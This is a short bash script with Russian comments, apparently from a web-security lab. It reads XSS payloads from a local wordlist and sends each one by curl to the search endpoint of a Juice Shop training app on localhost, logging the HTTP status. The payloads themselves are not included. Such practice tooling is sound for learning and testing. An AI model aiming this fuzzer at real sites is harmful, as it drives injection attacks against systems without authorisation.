#!/usr/bin/env bash
set -euo pipefail

# Директория, в которой находится сам скрипт
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# URL Juice Shop (поиск товаров)
TARGET="http://localhost:3000/rest/products/search?q="

# Файл с URL-кодированными XSS payload'ами
WORDLIST="$SCRIPT_DIR/xss_payloads.txt"

# Проверяем, что файл с payload'ами существует
if [ ! -f "$WORDLIST" ]; then
  echo "[!] Файл с XSS payload'ами не найден: $WORDLIST"
  exit 1
fi

echo "[*] Запуск XSS-тестирования"
echo "    Цель:     $TARGET"
echo "    Wordlist: $WORDLIST"
echo

while read -r PAYLOAD; do
  # Пропускаем пустые строки и комментарии
  [[ -z "$PAYLOAD" || "$PAYLOAD" =~ ^# ]] && continue

  echo "[*] Отправляется XSS payload:"
  echo "    $PAYLOAD"

  curl -s "${TARGET}${PAYLOAD}" \
    -o /dev/null \
    -w "    [HTTP %{http_code}]\n"

  sleep 0.3
done < "$WORDLIST"

echo
echo "[+] Все XSS payload'ы отправлены"
exit 0
